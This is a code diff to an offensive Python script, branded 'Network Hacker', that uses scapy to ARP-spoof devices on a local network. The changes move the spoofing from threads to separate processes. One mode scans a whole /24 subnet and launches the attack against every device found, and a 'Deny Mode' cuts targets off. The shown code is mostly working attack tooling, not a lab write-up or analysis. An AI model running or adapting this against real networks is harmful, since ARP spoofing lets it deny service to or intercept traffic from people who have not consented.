@@ -4,7 +4,7 @@ import time
 import scapy.all as scapy
 import argparse
 import sys
-import threading
+import multiprocessing as mp
 
 import pyfiglet
 ascii_banner = pyfiglet.figlet_format("Network Hacker",font="banner3-D")
@@ -31,6 +31,8 @@ def get_arguments():
         parser.error("[-] Please specify a gateway IP, use --help for more info.")
     return options
 
+option = get_arguments()
+processes = []
 
 def get_mac(ip):
     try:
@@ -96,8 +98,8 @@ def start_attack(target_ip, gateway_ip):
 
     except KeyboardInterrupt:
         print("\n[+] Detected CTRL + C ...... Resetting ARP Tables ...... Please wait.")
-        if len(threads) > 0:
-            for index, thread in enumerate(threads):
+        if len(processes) > 0:
+            for index, thread in enumerate(processes):
                 logging.info("Main    : before joining thread %d.", index)
                 thread.join()
                 logging.info("Main    : thread %d done", index)
@@ -106,8 +108,6 @@ def start_attack(target_ip, gateway_ip):
         print("[+] ARP Tables Reset Successfully")
 
 
-option = get_arguments()
-threads = list()
 print("\n[+][+]\t\tWelcome to Network Controller\t\t[+][+]\n")
 if option.mode == 'd':
     print("[+] Starting ARP Spoofing Attack in Deny Mode")
@@ -120,9 +120,9 @@ if option.all:
     res = scan_network(option.gateway_ip + "/24", option.timeout)
     print("[+] Found " + str(len(res)) + " devices")
     for i in res:
-        x = threading.Thread(target=start_attack, args=(i[1].psrc, option.gateway_ip))
-        threads.append(x)
+        x = mp.Process(target=start_attack, args=(i[1].psrc, option.gateway_ip))
         x.start()
+        processes.append(x)
 
 elif option.list_ip:
     print("[+] Spoofing devices " + str(option.list_ip))
